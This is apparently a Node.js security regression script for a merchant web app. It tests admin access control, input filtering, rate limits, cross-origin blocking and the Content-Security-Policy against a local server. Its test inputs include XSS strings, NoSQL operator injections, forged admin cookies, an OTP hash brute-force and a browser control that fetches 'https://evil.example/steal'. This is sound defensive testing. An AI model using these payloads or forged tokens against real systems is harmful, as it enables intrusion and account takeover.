// Security regression, phase 2: admin RBAC, public endpoints, edge headers (see docs/security-audit-web-phase2.md).
//
// Admin: every handler under src/app/api/admin (found by scanning the folder, so a new route is covered
//   automatically) answers 401 with no credentials, with a valid MERCHANT session (portal token, also presented as an
//   admin cookie), with a forged admin cookie and with a wrong x-admin-secret. A viewer account can read but gets 403
//   on writes, exports and user management.
// Public: stored-text filter (links/handles refused), one confirmation per phone per 24 h, per-IP limits, the global
//   outbound budget (leads and newsletter still saved, messages skipped), demo-request validated/limited, email OTP
//   per-IP + global caps, non-string bodies never 500, mock Green API only (nothing real is contacted).
// Edge: cross-site state-changing API calls refused (Origin / Sec-Fetch-Site), licence routes exempt; CSP + the other
//   headers on pages and API; no CORS allow-headers; a real Chrome crawl records `securitypolicyviolation` events
//   on public, auth, admin and portal pages (must be zero) and proves the policy bites (remote script, fetch, frame).
//
// Start the server with: GREEN_API_INSTANCE_ID=TEST GREEN_API_API_TOKEN=TOKEN GREEN_API_BASE_URL=http://127.0.0.1:4545
//   PUBLIC_WA_PER_HOUR=6 PUBLIC_OTP_PER_HOUR=20 NEXT_PUBLIC_API_URL= MONGODB_URI=mongodb://127.0.0.1:27018 MONGODB_DB=<DB>
// Run: APP_DIR=. BASE=… MONGODB_DB=<DB> CHROME=… PROFILE=… [OUT=…] [ENV_FILE=.env.development.local] node scripts/e2e/security-phase2-e2e.mjs
import { spawn } from 'node:child_process'
import { createHash, createHmac } from 'node:crypto'
import { createServer } from 'node:http'
import { mkdirSync, readFileSync, readdirSync, rmSync, statSync } from 'node:fs'
import { createRequire } from 'node:module'
import { join, resolve } from 'node:path'

const B = process.env.BASE || 'http://localhost:3022'
const APP = resolve(process.env.APP_DIR || process.cwd())
const OUT = process.env.OUT; if (OUT) mkdirSync(OUT, { recursive: true })
const ENV = readFileSync(resolve(APP, process.env.ENV_FILE || '.env.local'), 'utf8')
const envVar = (k) => (ENV.match(new RegExp(`^${k}=(.*)$`, 'm')) || [])[1]?.trim()
const SECRET = envVar('NEXTAUTH_SECRET'), ADMIN_SECRET = envVar('ADMIN_SECRET')
const { MongoClient } = createRequire(`${APP}/package.json`)('mongodb')
const mongo = new MongoClient('mongodb://127.0.0.1:27018'); await mongo.connect()
const db = mongo.db(process.env.MONGODB_DB || 'magharebit_sec2')
await db.dropDatabase()
for (const [c, k] of [['suppliers', { merchantId: 1, name: 1 }], ['customers', { merchantId: 1, phone: 1 }], ['employees', { merchantId: 1, loginId: 1 }], ['subscribers', { phone: 1 }]]) await db.collection(c).createIndex(k, { unique: true }).catch(() => {})
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let pass = 0, fail = 0
const check = (n, ok, x = '') => { if (ok) pass++; else fail++; console.log(`${ok ? 'PASS' : 'FAIL'}  ${n}${x ? '  ' + x : ''}`) }
const rawFetch = globalThis.fetch
globalThis.fetch = async (...a) => { for (let i = 0; ; i++) { try { return await rawFetch(...a) } catch (e) { if (e?.cause?.code !== 'ECONNRESET' || i >= 3) throw e; await sleep(300) } } }
let ipSeq = 10
const freshIp = () => `198.51.100.${++ipSeq}`           // documentation range; the dev server trusts x-forwarded-for
const api = (path, { method = 'GET', body, cookie, headers = {}, ip, raw } = {}) => fetch(B + path, { method, headers: { ...(body !== undefined || raw !== undefined ? { 'content-type': 'application/json' } : {}), ...(cookie ? { cookie } : {}), ...(ip ? { 'x-forwarded-for': ip } : {}), ...headers }, body: raw ?? (body !== undefined ? JSON.stringify(body) : undefined) })
const cookieOf = (r) => (r.headers.getSetCookie?.() ?? []).map((c) => c.split(';')[0]).join('; ')
const findOtp = (id, hash) => { for (let n = 100000; n <= 999999; n++) if (createHash('sha256').update(`${n}:${id}:${SECRET}`).digest('hex') === hash) return String(n); return null }
const hmac = (e) => createHmac('sha256', SECRET).update(e).digest('hex')

// ── mock Green API ──────────────────────────────────────────────────────────
const wa = []
const mock = createServer((req, res) => { let b = ''; req.on('data', (c) => (b += c)); req.on('end', () => { try { wa.push(JSON.parse(b)) } catch { wa.push({}) } res.writeHead(200, { 'content-type': 'application/json' }); res.end('{"idMessage":"MOCK"}') }) }).listen(4545, '127.0.0.1')
await new Promise((r) => mock.once('listening', r))
const waCount = async () => { await sleep(1500); return wa.length }

// ═══ 0. STATIC: no raw exception text in 5xx responses ══════════════════════
{
  const apiDir = resolve(APP, 'src/app/api'); const leaks = []
  const scan = (d) => { for (const f of readdirSync(d)) { const p = join(d, f); if (statSync(p).isDirectory()) scan(p); else if (f === 'route.ts') {
    readFileSync(p, 'utf8').split('\n').forEach((l, i) => { if (/detail:\s*(msg|err|e)\b|error:\s*(msg|err\.message)\s*\}\s*,\s*\{\s*status:\s*5\d\d/.test(l)) leaks.push(`${p.slice(apiDir.length)}:${i + 1}`) })
  } } }
  scan(apiDir)
  check('no API route returns raw exception text in a 5xx (generic code + masked server log instead)', leaks.length === 0, leaks.slice(0, 4).join(' '))
}

// ═══ 1. ADMIN RBAC ══════════════════════════════════════════════════════════
const adminDir = resolve(APP, 'src/app/api/admin')
const routes = []
const walk = (d) => { for (const f of readdirSync(d)) { const p = join(d, f); if (statSync(p).isDirectory()) walk(p); else if (f === 'route.ts') routes.push(p) } }
walk(adminDir)
const sample = { id: 'a'.repeat(24), kind: 'shop-types', dataset: 'merchants' }
const endpoints = []
for (const f of routes) {
  const rel = f.slice(adminDir.length).replace(/\\/g, '/').replace(/\/route\.ts$/, '')
  if (/^\/(login|logout)$/.test(rel)) continue
  const url = '/api/admin' + rel.replace('[id]', sample.id).replace('[kind]', sample.kind).replace('[dataset]', sample.dataset)
  for (const m of readFileSync(f, 'utf8').matchAll(/export async function (GET|POST|PATCH|PUT|DELETE)\b/g)) endpoints.push([m[1], url])
}
check(`found ${endpoints.length} admin handlers in ${routes.length} route files`, endpoints.length >= 25)

const merchantToken = (() => { const e = Buffer.from(JSON.stringify({ merchantId: 'b'.repeat(24), identifier: 'x', exp: Date.now() + 60_000 })).toString('base64url'); return `${e}.${hmac(e)}` })()
const forgedAdmin = (() => { const e = Buffer.from(JSON.stringify({ sub: 'owner', name: 'owner', role: 'owner', exp: Date.now() + 60_000 })).toString('base64url'); return `${e}.${hmac(e)}` })()
const attempts = {
  'no credentials': {},
  'a valid merchant session': { cookie: `portal_session=${merchantToken}; mgh_admin=${merchantToken}` },
  'a forged admin cookie (signed with NEXTAUTH_SECRET only)': { cookie: `mgh_admin=${forgedAdmin}` },
  'a wrong x-admin-secret': { headers: { 'x-admin-secret': 'wrong-secret-value' } },
}
for (const [label, opts] of Object.entries(attempts)) {
  const bad = []
  for (const [m, url] of endpoints) {
    const r = await api(url, { method: m, body: m === 'GET' ? undefined : {}, ...opts })
    if (r.status !== 401) bad.push(`${m} ${url} → ${r.status}`)
  }
  check(`every admin handler answers 401 with ${label}`, bad.length === 0, bad.slice(0, 3).join(' | '))
}

const owner = await api('/api/admin/login', { method: 'POST', body: { password: ADMIN_SECRET }, ip: freshIp() })
const ownerCookie = cookieOf(owner)
check('owner signs in with the break-glass secret (HttpOnly, SameSite=Strict cookie)', owner.status === 200 && /HttpOnly/i.test(owner.headers.get('set-cookie') || '') && /SameSite=strict/i.test(owner.headers.get('set-cookie') || ''))
const mk = await api('/api/admin/users', { method: 'POST', body: { username: 'lecteur', displayName: 'Lecteur', role: 'viewer', password: 'un-mot-de-passe-solide-1' }, cookie: ownerCookie })
const viewerLogin = await api('/api/admin/login', { method: 'POST', body: { username: 'lecteur', password: 'un-mot-de-passe-solide-1' }, ip: freshIp() })
const viewer = cookieOf(viewerLogin)
check('a viewer account exists and signs in', mk.status === 201 && viewerLogin.status === 200, `${mk.status} ${viewerLogin.status}`)
const vget = await Promise.all(['/api/admin/dashboard', '/api/admin/merchants', '/api/admin/audit-logs'].map((u) => api(u, { cookie: viewer })))
check('viewer can read dashboard, merchants and audit log', vget.every((r) => r.status === 200), vget.map((r) => r.status).join(','))
const vwrite = [
  ['POST', '/api/admin/coupons', { code: 'TEST10', percent: 10 }],
  ['POST', '/api/admin/notifications', { title: 'x', body: 'y', audience: 'all' }],
  ['POST', `/api/admin/merchants/${sample.id}/approve`, {}],
  ['POST', `/api/admin/licenses/${sample.id}/revoke`, {}],
  ['POST', `/api/admin/licenses/${sample.id}/extend`, { days: 30 }],
  ['PUT', '/api/admin/settings/tipping', {}],
  ['GET', '/api/admin/export/merchants', undefined],
  ['GET', '/api/admin/users', undefined],
  ['POST', '/api/admin/users', { username: 'pirate', displayName: 'P', role: 'operator', password: 'un-mot-de-passe-solide-2' }],
]
const vres = []
for (const [m, u, b] of vwrite) vres.push([m, u, (await api(u, { method: m, body: b, cookie: viewer })).status])
check('viewer gets 403 on writes, exports and user management', vres.every(([, , s]) => s === 403), vres.filter(([, , s]) => s !== 403).map(([m, u, s]) => `${m} ${u} ${s}`).join(' | '))
const selfUpgrade = await api('/api/admin/users/' + sample.id, { method: 'PATCH', body: { disabled: false }, cookie: viewer })
check('viewer cannot change admin accounts', selfUpgrade.status === 403, String(selfUpgrade.status))
check('after those attempts no viewer-created user exists', (await db.collection('admin_users').countDocuments({ username: 'pirate' })) === 0)

// ═══ 2. PUBLIC ENDPOINTS ════════════════════════════════════════════════════
const lead = (over = {}, ip = freshIp()) => api('/api/leads', { method: 'POST', ip, body: { storeName: 'Boulangerie Atlas', phone: '0661000001', businessType: 'bakery', city: 'Fès', locale: 'fr', ...over } })
const refused = [
  [{ storeName: 'Gagnez 500 DH sur https://evil.example/promo' }, 'URL in the store name'],
  [{ storeName: 'Gagnez 500 DH sur www.evil.example' }, 'www link'],
  [{ storeName: 'Écrivez-moi @arnaque_officielle' }, '@handle'],
  [{ storeName: 'Boutique evil.com' }, 'bare domain'],
  [{ storeName: 'Atlas <script>alert(1)</script>' }, 'markup'],
  [{ storeName: 'Atlas wa.me/212600000000' }, 'wa.me link'],
  [{ storeName: { $ne: null } }, 'operator object'],
  [{ city: 'Fès https://evil.example' }, 'URL in the city'],
  [{ phone: ['0661000002'] }, 'phone as an array'],
]
for (const [over, what] of refused) { const r = await lead(over); check(`lead refused (400): ${what}`, r.status === 400, String(r.status)) }
check('nothing refused was stored', (await db.collection('leads').countDocuments()) === 0)
const accented = await lead({ storeName: "Café L'Étoile & Fils – مخبزة الأمل", phone: '0661000010' })
check('a normal French/Arabic store name with accents, apostrophe and & is accepted', accented.status === 201, String(accented.status))
await sleep(1500); wa.length = 0

const L1 = await lead({ phone: '0661000020', storeName: 'Épicerie Zellige' })
check('lead accepted', L1.status === 201)
const n1 = await waCount()
check('first lead for a phone: confirmation to the visitor + alert to the team (2 messages)', n1 === 2, `${n1}`)
const L2 = await lead({ phone: '0661000020', storeName: 'Épicerie Zellige bis' })
const n2 = await waCount()
check('same phone again within 24 h: still saved (201) but NO second confirmation (only the team alert)', L2.status === 201 && n2 - n1 === 1 && (await db.collection('leads').countDocuments({ phone: '0661000020' })) === 2, `+${n2 - n1}`)

// newsletter (welcome message once; budget so far: accented lead 2 + L1 2 + L2 alert 1 = 5 of 6, so the welcome fits)
const nl = await api('/api/newsletter', { method: 'POST', ip: freshIp(), body: { phone: '0661000040', locale: 'fr' } })
const nlDup = await api('/api/newsletter', { method: 'POST', ip: freshIp(), body: { phone: '0661000040', locale: 'fr' } })
const n3 = await waCount()
check('newsletter: welcome sent once; a repeat for the same phone sends nothing', nl.status === 200 && (await nlDup.json()).alreadySubscribed === true && n3 - n2 === 1, `+${n3 - n2}`)
const nlObj = await api('/api/newsletter', { method: 'POST', ip: freshIp(), body: { phone: { $ne: null } } })
check('newsletter with an operator object → 400, not 500', nlObj.status === 400, String(nlObj.status))

// per-IP limit (from here on the global budget is exhausted: leads are still saved, messages are skipped)
const sameIp = freshIp(); const statuses = []
for (let i = 0; i < 7; i++) statuses.push((await lead({ phone: `06610001${30 + i}` }, sameIp)).status)
check('per-IP limit: 5 leads per hour, then 429', statuses.slice(0, 5).every((s) => s === 201) && statuses.slice(5).every((s) => s === 429), statuses.join(','))

// global budget, from a clean counter: PUBLIC_WA_PER_HOUR=6 → exactly 6 messages go out, however many leads arrive
await db.collection('rate_limits').deleteMany({})
const sent = []
for (let i = 0; i < 6; i++) {
  const b = await waCount()
  const r = await lead({ phone: `06610002${10 + i}`, storeName: `Boutique Budget ${i}` })
  sent.push([r.status, (await waCount()) - b])
}
check('global budget: all 6 leads are saved (201) whatever happens to the messages', sent.every(([s]) => s === 201) && (await db.collection('leads').countDocuments({ storeName: /^Boutique Budget/ })) === 6, JSON.stringify(sent))
check('global budget: exactly 6 messages go out (2+2+2), then none: the flood stops at the ceiling', sent.map(([, d]) => d).join(',') === '2,2,2,0,0,0', sent.map(([, d]) => d).join(','))
const nlLate = await api('/api/newsletter', { method: 'POST', ip: freshIp(), body: { phone: '0661000052', locale: 'fr' } })
const nb = await waCount()
check('global budget exhausted: the newsletter subscription is kept but its welcome is skipped', nlLate.status === 200 && nb === 6 + (n3 - n2) + n2 && (await db.collection('subscribers').countDocuments({ phone: '0661000052' })) === 1, `total messages ${nb}`)

// demo-request
const dr = (b, ip = freshIp()) => api('/api/demo-request', { method: 'POST', body: b, ip })
const drBad = await dr({ storeName: 'Voir https://evil.example', phone: '0661000060', businessType: 'cafe' })
const drObj = await dr({ storeName: { $gt: '' }, phone: '0661000060', businessType: 'cafe' })
const drOk = await dr({ storeName: 'Café Atlas', phone: '0661000060', businessType: 'cafe', city: 'Rabat', locale: 'fr' })
check('demo-request: link in the name → 400, operator object → 400, valid → 200', drBad.status === 400 && drObj.status === 400 && drOk.status === 200, `${drBad.status} ${drObj.status} ${drOk.status}`)
const drIp = freshIp(); const drStatuses = []
for (let i = 0; i < 7; i++) drStatuses.push((await dr({ storeName: 'Café Atlas', phone: '0661000061', businessType: 'cafe' }, drIp)).status)
check('demo-request: 5 per hour per IP (this route had no limit), then 429', drStatuses.slice(0, 5).every((s) => s === 200) && drStatuses.slice(5).every((s) => s === 429), drStatuses.join(','))

// quick-callback
const cbIp = freshIp()
const cb = await api('/api/quick-callback', { method: 'POST', ip: cbIp, body: { phone: '0661000070', locale: 'fr', page: '<script>alert(1)</script>' } })
const cbRow = await db.collection('callbacks').findOne({ phone: '0661000070' })
check('quick-callback: a markup "page" is replaced by "/" before storing', cb.status === 201 && cbRow?.page === '/', String(cbRow?.page))
const cbObj = await api('/api/quick-callback', { method: 'POST', ip: freshIp(), body: { phone: { $ne: null } } })
check('quick-callback with an operator object → 400', cbObj.status === 400, String(cbObj.status))

// OTP senders: types, per-IP cap (email had none), global cap
const typed = await Promise.all([
  api('/api/auth/send-otp', { method: 'POST', ip: freshIp(), body: { phone: { $ne: null } } }),
  api('/api/auth/send-otp-sms', { method: 'POST', ip: freshIp(), body: { phone: ['0661000080'] } }),
  api('/api/auth/send-otp-email', { method: 'POST', ip: freshIp(), body: { email: { $ne: null } } }),
])
check('OTP senders with non-string fields → 400, never 500', typed.every((r) => r.status === 400), typed.map((r) => r.status).join(','))
const otpIp = freshIp(); const es = []
for (let i = 0; i < 14; i++) es.push((await api('/api/auth/send-otp-email', { method: 'POST', ip: otpIp, body: { email: `cible${i}@example.com` } })).status)
check('email OTP: per-IP cap of 12 per 10 min (it had none), 13th and 14th → 429', es.slice(0, 12).every((s) => s === 200) && es.slice(12).every((s) => s === 429), es.join(','))
let firstBlocked = -1, ok = 0
for (let i = 0; i < 30 && firstBlocked < 0; i++) { const r = await api('/api/auth/send-otp-email', { method: 'POST', ip: freshIp(), body: { email: `autre${i}@example.com` } }); if (r.status === 429) firstBlocked = i; else if (r.status === 200) ok++ }
check('email OTP: with a different IP every time the GLOBAL budget still stops the flood (20/h here)', firstBlocked > 0 && ok >= 1 && ok + 12 <= 20, `${ok} more accepted, blocked at #${firstBlocked}`)

// ═══ 3. ORIGIN GUARD, HEADERS, CORS ═════════════════════════════════════════
const probe = (extra) => api('/api/newsletter', { method: 'POST', ip: freshIp(), body: { phone: '0661000090' }, ...extra })
const evil = await probe({ headers: { origin: 'https://evil.example' } })
const evilJ = await evil.json().catch(() => ({}))
check('cross-origin POST (Origin: evil) → 403 cross_origin_blocked', evil.status === 403 && evilJ.error === 'cross_origin_blocked', `${evil.status} ${evilJ.error}`)
const sfs = await probe({ headers: { 'sec-fetch-site': 'cross-site' } })
check('Sec-Fetch-Site: cross-site → 403', sfs.status === 403, String(sfs.status))
const simple = await api('/api/leads', { method: 'POST', ip: freshIp(), headers: { origin: 'https://evil.example', 'content-type': 'text/plain' }, raw: JSON.stringify({ storeName: 'Atlas', phone: '0661000091' }) })
check('the "simple request" bypass (text/plain from another origin) → 403 before any handler', simple.status === 403, String(simple.status))
const nullOrigin = await probe({ headers: { origin: 'null' } })
check('Origin: null (sandboxed frame) → 403', nullOrigin.status === 403, String(nullOrigin.status))
const same = await probe({ headers: { origin: B } })
check('same-origin POST (the site\'s own forms) is not blocked', same.status !== 403, String(same.status))
const none = await probe({})
check('no Origin (curl, server-to-server) is not blocked', none.status !== 403, String(none.status))
const lic = await api('/api/licenses/validate', { method: 'POST', ip: freshIp(), headers: { origin: 'tauri://localhost' }, body: { key: 'x' } })
const licJ = await lic.json().catch(() => ({}))
check('POS licence endpoint accepts its own app origin (exempt from the guard)', lic.status !== 403 || licJ.error !== 'cross_origin_blocked', `${lic.status} ${JSON.stringify(licJ).slice(0, 60)}`)
const get = await api('/api/health', { headers: { origin: 'https://evil.example' } })
check('GET is never blocked by the guard', get.status !== 403)

const page = await rawFetch(B + '/fr')
const hdr = (r, k) => r.headers.get(k) || ''
const csp = hdr(page, 'content-security-policy')
check('page: Content-Security-Policy present with frame-ancestors none, object-src none, base-uri self, form-action self', ['frame-ancestors \'none\'', "object-src 'none'", "base-uri 'self'", "form-action 'self'", "default-src 'self'"].every((d) => csp.includes(d)), csp.slice(0, 80))
check('page: no remote script origin, no wildcard, YouTube/Vimeo only for frames', !/script-src[^;]*https?:/.test(csp) && !/\*/.test(csp) && /frame-src https:\/\/www\.youtube-nocookie\.com https:\/\/player\.vimeo\.com/.test(csp))
check('page: X-Frame-Options DENY, nosniff, Referrer-Policy, HSTS, X-XSS-Protection 0, COOP', hdr(page, 'x-frame-options') === 'DENY' && hdr(page, 'x-content-type-options') === 'nosniff' && hdr(page, 'referrer-policy') === 'strict-origin-when-cross-origin' && /max-age=\d{8,}/.test(hdr(page, 'strict-transport-security')) && hdr(page, 'x-xss-protection') === '0' && hdr(page, 'cross-origin-opener-policy') === 'same-origin')
const apiRes = await rawFetch(B + '/api/health')
check('API responses carry the same headers', !!hdr(apiRes, 'content-security-policy') && hdr(apiRes, 'x-frame-options') === 'DENY' && hdr(apiRes, 'x-content-type-options') === 'nosniff')
const pre = await rawFetch(B + '/api/leads', { method: 'OPTIONS', headers: { origin: 'https://evil.example', 'access-control-request-method': 'POST', 'access-control-request-headers': 'content-type' } })
const cors = await rawFetch(B + '/api/health', { headers: { origin: 'https://evil.example' } })
check('CORS: no Access-Control-Allow-* on a preflight or a cross-origin GET (browsers refuse the read)', !pre.headers.get('access-control-allow-origin') && !cors.headers.get('access-control-allow-origin') && !cors.headers.get('access-control-allow-credentials'))

// ═══ 4. REAL BROWSER: no CSP violation on the real pages + positive controls ═
rmSync(process.env.PROFILE, { recursive: true, force: true })
const chrome = spawn(process.env.CHROME, ['--headless=new', '--disable-gpu', `--user-data-dir=${process.env.PROFILE}`, '--remote-debugging-port=9358', '--window-size=1440,900', 'about:blank'], { stdio: 'ignore' })
let targets
for (let i = 0; i < 40; i++) { try { targets = await (await rawFetch('http://127.0.0.1:9358/json')).json(); if (targets.length) break } catch {} await sleep(500) }
const ws = new WebSocket(targets.find((t) => t.type === 'page').webSocketDebuggerUrl); await new Promise((r) => (ws.onopen = r))
let id = 0; const pending = new Map()
ws.onmessage = (m) => { const d = JSON.parse(m.data); if (d.id && pending.has(d.id)) { pending.get(d.id)(d); pending.delete(d.id) } }
const send = (method, params = {}) => new Promise((res) => { const i = ++id; const t = setTimeout(() => { pending.delete(i); res({ result: {} }) }, 90000); pending.set(i, (d) => { clearTimeout(t); res(d) }); ws.send(JSON.stringify({ id: i, method, params })) })
const js = async (e) => (await send('Runtime.evaluate', { expression: e, awaitPromise: true, returnByValue: true })).result?.result?.value
const waitFor = async (e, ms = 60000) => { const t = Date.now(); while (Date.now() - t < ms) { if (await js(e)) return true; await sleep(300) } return false }
const goto = async (u) => { await send('Page.navigate', { url: B + u }); await sleep(1500) }
await send('Page.enable'); await send('Runtime.enable'); await send('Network.enable')
await send('Page.addScriptToEvaluateOnNewDocument', { source: `window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective + ' ← ' + (e.blockedURI || 'inline').slice(0, 80)))` })

// a real merchant for the portal pages (counters reset: the abuse tests above used up the OTP budget on purpose)
await db.collection('rate_limits').deleteMany({})
const local = '0662' + String(Date.now()).slice(-6); const phone = '212' + local.slice(1)
await api('/api/auth/send-otp', { method: 'POST', ip: freshIp(), body: { phone: local, locale: 'fr' } })
const otpDoc = await db.collection('otp_sessions').findOne({ phone }, { sort: { created_at: -1 } })
const ver = await api('/api/auth/verify-otp', { method: 'POST', ip: freshIp(), body: { phone: local, otp: findOtp(phone, otpDoc.otp_hash), locale: 'fr' } })
const su = await api('/api/auth/complete-signup', { method: 'POST', ip: freshIp(), body: { phone: local, storeName: 'Boutique CSP', sector: 'epicerie', city: 'Fès', locale: 'fr' }, cookie: cookieOf(ver) })
const { licenseKey } = await su.json()
const loginRes = await api('/api/portal/auth/login', { method: 'POST', ip: freshIp(), body: { identifier: local, licenseKey } })
for (const c of (loginRes.headers.getSetCookie?.() ?? [])) { const [nv] = c.split(';'); const [name, ...v] = nv.split('='); await send('Network.setCookie', { name, value: v.join('='), url: B, httpOnly: true }) }
for (const c of ownerCookie.split('; ').filter(Boolean)) { const [name, ...v] = c.split('='); await send('Network.setCookie', { name, value: v.join('='), url: B, httpOnly: true }) }

const pages = ['/fr', '/ar', '/en', '/fr/pricing', '/fr/features', '/fr/faq', '/fr/auth/signup', '/fr/portal/login', '/fr/portal/dashboard', '/fr/portal/products', '/fr/portal/sales', '/fr/admin']
const violations = {}
for (const p of pages) {
  await goto(p)
  await waitFor(`document.readyState === 'complete'`, 60000)
  if (p === '/fr') { await js(`document.querySelector('#video button')?.click(); true`); await sleep(500) }
  if (p === '/fr') { await js(`document.querySelector('#demo input, form input')?.focus(); true`) }
  await sleep(1200)
  const v = await js(`window.__csp`)
  if (v?.length) violations[p] = v
}
check(`no CSP violation on ${pages.length} real pages (public, auth, portal, admin; video modal opened)`, Object.keys(violations).length === 0, JSON.stringify(violations).slice(0, 300))

await goto('/fr')
const control = await js(`(async () => {
  const out = {};
  const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.appendChild(s);
  try { await fetch('https://evil.example/steal', { mode: 'no-cors' }); out.fetch = 'allowed' } catch { out.fetch = 'blocked' }
  const f = document.createElement('iframe'); f.src = 'https://evil.example/'; document.body.appendChild(f);
  const o = document.createElement('object'); o.data = 'https://evil.example/x.swf'; document.body.appendChild(o);
  await new Promise((r) => setTimeout(r, 800));
  out.violations = window.__csp.slice(-6);
  return out;
})()`)
const dirs = (control?.violations ?? []).map((v) => v.split(' ← ')[0]).join(' ')
check('policy bites (positive control): a remote script, a fetch to another origin, a foreign iframe and an <object> are all blocked', control?.fetch === 'blocked' && /script-src/.test(dirs) && /frame-src/.test(dirs) && /object-src|default-src/.test(dirs), JSON.stringify(control).slice(0, 220))
const framed = await js(`(async () => { try { const r = await fetch('/fr', { method: 'HEAD' }); return r.headers.get('x-frame-options') } catch { return 'err' } })()`)
check('the page cannot be framed (X-Frame-Options DENY + frame-ancestors none)', framed === 'DENY')

chrome.kill(); await new Promise((r) => mock.close(r)); await mongo.close()
console.log(`\n${pass} passed, ${fail} failed`)
process.exit(fail ? 1 : 0)
